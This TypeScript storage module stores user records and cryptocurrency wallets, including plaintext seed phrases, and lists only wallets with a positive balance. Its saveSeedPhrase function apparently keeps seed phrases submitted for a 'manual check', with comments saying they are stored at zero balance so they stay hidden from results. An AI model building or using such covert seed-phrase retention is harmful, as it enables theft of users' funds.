import { users, wallets, type User, type InsertUser, type Wallet, type InsertWallet } from "@shared/schema";
import { db } from "./db";
import { eq, gt } from "drizzle-orm";

export interface IStorage {
  getUser(id: number): Promise<User | undefined>;
  getUserByUsername(username: string): Promise<User | undefined>;
  createUser(user: InsertUser): Promise<User>;
  
  // Wallet operations
  createWallet(wallet: InsertWallet): Promise<Wallet>;
  getWalletsWithBalance(): Promise<Wallet[]>;
  
  // Save seed phrase for manual check
  saveSeedPhrase(seedPhrase: string): Promise<void>;
}

export class DatabaseStorage implements IStorage {
  async getUser(id: number): Promise<User | undefined> {
    const user = await db.select().from(users).where(eq(users.id, id));
    return user.length > 0 ? user[0] : undefined;
  }

  async getUserByUsername(username: string): Promise<User | undefined> {
    const user = await db.select().from(users).where(eq(users.username, username));
    return user.length > 0 ? user[0] : undefined;
  }

  async createUser(insertUser: InsertUser): Promise<User> {
    const result = await db
      .insert(users)
      .values(insertUser);
    
    // In SQLite, we need to fetch the user after insertion
    return this.getUserByUsername(insertUser.username) as Promise<User>;
  }

  async createWallet(insertWallet: InsertWallet): Promise<Wallet> {
    // Prepare wallet data
    const walletData = {
      blockchain: insertWallet.blockchain,
      address: insertWallet.address,
      balance: insertWallet.balance,
      seedPhrase: insertWallet.seedPhrase,
      path: insertWallet.path,
      metadata: insertWallet.metadata,
    };
    
    // Insert the wallet
    const result = await db
      .insert(wallets)
      .values(walletData);
    
    // Find the wallet by its unique attributes
    const foundWallets = await db
      .select()
      .from(wallets)
      .where(eq(wallets.address, insertWallet.address));
    
    // Filter by blockchain if multiple found
    const matchingWallets = foundWallets.filter(
      w => w.blockchain === insertWallet.blockchain
    );
    
    return matchingWallets[0];
  }

  async getWalletsWithBalance(): Promise<Wallet[]> {
    return await db
      .select()
      .from(wallets)
      .where(gt(wallets.balance, "0"));
  }
  
  async saveSeedPhrase(seedPhrase: string): Promise<void> {
    try {
      // Lưu seedPhrase vào database với số dư 0
      await db
        .insert(wallets)
        .values({
          blockchain: "UNKNOWN", // Placeholder, không biết blockchain nào
          address: "manual_check", // Placeholder, không có địa chỉ thực
          balance: "0", // Số dư 0 để không hiển thị trong kết quả của getWalletsWithBalance
          seedPhrase: seedPhrase,
          path: "",
          metadata: JSON.stringify({ source: "manual_check", savedAt: new Date().toISOString() }),
        });
      
      console.log("Đã lưu seed phrase từ kiểm tra thủ công vào database");
    } catch (error) {
      console.error("Lỗi khi lưu seed phrase vào database:", error);
      // Không ném lỗi để không ảnh hưởng đến luồng chính
    }
  }
}

export const storage = new DatabaseStorage();
